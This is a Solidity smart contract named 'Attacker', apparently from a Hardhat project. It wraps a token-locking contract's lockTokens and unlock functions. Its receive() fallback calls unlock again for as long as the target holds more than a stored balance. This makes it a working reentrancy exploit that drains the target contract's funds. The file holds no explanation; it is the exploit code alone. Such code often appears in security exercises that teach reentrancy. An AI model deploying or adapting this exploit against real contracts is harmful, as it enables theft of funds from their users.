// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

// Uncomment this line to use console.log
// import "hardhat/console.sol";

interface ILock {
    function lockTokens(uint _minutes) external payable;
    function unlock(uint256 id) external;
}

contract Attacker {
    address private target;
    uint256 private id;
    uint256 private balance;

    constructor(address _target) {
        target = _target;
    }

    function lockTokens(uint _minutes) public payable {
        ILock(target).lockTokens{value: msg.value}(_minutes);
    }
    
    function unlock(uint256 _id, uint256 _balance) public {
        balance = _balance;
        id = _id;
        ILock(target).unlock(id);
    }

    receive() external payable {
      if (address(target).balance > balance) {
        ILock(target).unlock(id);
      }
    }
}
